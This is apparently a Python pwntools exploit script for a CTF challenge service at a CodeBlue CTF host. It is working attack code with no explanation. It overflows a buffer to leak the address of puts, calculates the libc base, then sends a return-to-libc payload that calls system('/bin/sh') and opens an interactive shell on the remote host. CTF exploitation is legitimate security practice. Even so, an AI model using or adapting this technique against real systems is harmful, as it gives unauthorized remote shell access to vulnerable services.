from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'sms.tasks.ctf.codeblue.jp', 6029

r = remote(HOST, PORT)

menu = lambda: r.recvuntil('> ')

menu()
r.sendline('1')
main = 0x8048d01
puts = 0x8048530
payload = 'a' * 14 + p32(0) + p32(puts) + p32(main) + p32(0x804b02c)
r.sendline(payload)

for i in range(4):
	menu()
	r.sendline('1')
	payload = 'a' * 250
	r.sendline(payload)
menu()
def trigger():
	r.sendline('3')
	r.sendline('4')
	r.sendline('-15')
	r.sendline('3')
	r.sendline('4')
	r.sendline('0')
	r.sendline('3')
	r.sendline('0')
	r.sendline('0')
	r.sendline('4')

trigger()
r.recvuntil(':)\n')
puts = u32(r.recvline()[:4])
libc = ELF('/lib32/libc.so.6')
libc.address = puts - libc.symbols['puts']
system = libc.symbols['system']
binsh = libc.search('/bin/sh\x00').next()
print hex(libc.address)
payload = 'a' * 14 + p32(0) + p32(system) + p32(0) + p32(binsh)
menu()
r.sendline('1')
r.sendline(payload)
for i in range(4):
	menu()
	r.sendline('1')
	payload = 'a' * 250
	r.sendline(payload)
menu()
trigger()
r.interactive()